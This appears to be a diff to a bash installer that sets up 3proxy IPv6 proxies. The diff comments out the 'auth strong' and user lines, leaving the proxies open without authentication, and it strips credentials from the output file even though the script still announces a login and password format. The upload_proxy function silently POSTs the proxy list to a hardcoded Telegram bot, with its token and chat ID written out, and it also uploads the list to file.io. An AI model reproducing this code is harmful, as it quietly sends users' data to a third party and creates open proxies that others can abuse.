@@ -27,7 +27,7 @@ install_3proxy() {
     cp /3proxy/3proxy-0.9.3/scripts/3proxy.service2 /usr/lib/systemd/system/3proxy.service
     systemctl link /usr/lib/systemd/system/3proxy.service
     systemctl daemon-reload
-#   systemctl enable 3proxy
+#    systemctl enable 3proxy
     echo "* hard nofile 999999" >>  /etc/security/limits.conf
     echo "* soft nofile 999999" >>  /etc/security/limits.conf
     echo "net.ipv6.conf.$main_interface.proxy_ndp=1" >> /etc/sysctl.conf
@@ -56,12 +56,12 @@ setgid 65535
 setuid 65535
 stacksize 6291456
 flush
-auth strong
+#auth strong
 
-users $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})
+#users $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})
 
-$(awk -F "/" '{print "auth strong\n" \
-"allow " $1 "\n" \
+$(awk -F "/" '{print "\n" \
+"\n" \
 "proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
 "flush\n"}' ${WORKDATA})
 EOF
@@ -69,13 +69,12 @@ EOF
 
 gen_proxy_file_for_user() {
     cat >proxy.txt <<EOF
-$(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
+$(awk -F "/" '{print $3 ":" $4 }' ${WORKDATA})
 EOF
 }
 
 upload_proxy() {
     cd $WORKDIR
-
 
     cp proxy.txt "$IP4".txt
     curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-818506427' https://api.telegram.org/bot5748050505:AAEZEtv9aSEHk5VWmWVr68jiYP9KlimddnE/sendDocument
@@ -94,7 +93,6 @@ upload_proxy() {
     echo "Loading..."
     echo "Loading..."
 
-
     local PASS=$(random)
     zip --password $PASS proxy.zip proxy.txt
     URL=$(curl -F "file=@proxy.zip" https://file.io)
@@ -102,7 +100,6 @@ upload_proxy() {
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
-
 
 }
 gen_data() {
@@ -123,9 +120,6 @@ $(awk -F "/" '{print "ifconfig '$main_interface' inet6 add " $5 "/64"}' ${WORKDA
 EOF
 }
 echo "installing apps"
-
-
-# error
 yum -y install gcc net-tools bsdtar zip make >/dev/null
 
 install_3proxy
